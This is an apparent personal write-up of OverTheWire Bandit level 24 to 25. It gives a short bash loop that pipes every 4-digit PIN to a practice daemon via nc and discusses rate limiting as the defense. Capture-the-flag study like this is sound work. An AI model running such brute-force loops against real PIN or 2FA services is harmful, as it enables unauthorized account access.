# Bandit Level 24 → 25

## Objective
A daemon is listening on port 30002. It accepts the current password followed by a 4-digit PIN. We need to brute-force all 10,000 combinations (0000–9999) to find the correct PIN and receive the next password.

## Solution
Write a bash script that generates all 10,000 combinations and pipes them to `nc` on port 30002.

## Commands Used
```bash
cd /tmp/meu_hack
nano brute.sh
```

Contents of `brute.sh`:
```bash
#!/bin/bash
senha="<current_bandit24_password>"

for i in $(seq -w 0 9999); do
    echo "$senha $i"
done
```

```bash
chmod +x brute.sh
./brute.sh | nc localhost 30002
```

## What I Learned

### Automation vs. Manual Work
If testing each of 10,000 PINs manually took 5 seconds each, it would take over 13 hours. A script runs all 10,000 tests in under 30 seconds. The cost-benefit of automation is obvious.

### for Loop in Bash
```bash
for i in {0000..9999}; do
    echo "$senha $i"
done
```
Or with `seq -w` for zero-padded numbers:
```bash
for i in $(seq -w 0 9999); do ...
```

### Piping to nc
By piping all guesses directly to `nc`, we send them in bulk without opening multiple connections. The server processes them sequentially and responds when the correct PIN is found.

### Security Relevance
Brute-forcing PIN codes is a real attack technique against:
- ATM PINs
- Mobile device unlock codes
- 2FA systems without rate limiting

Rate limiting, account lockouts, and CAPTCHAs are defenses against exactly this type of attack.

## Conclusion
The script tested all combinations and the server responded with the correct PIN and the password for the next level.
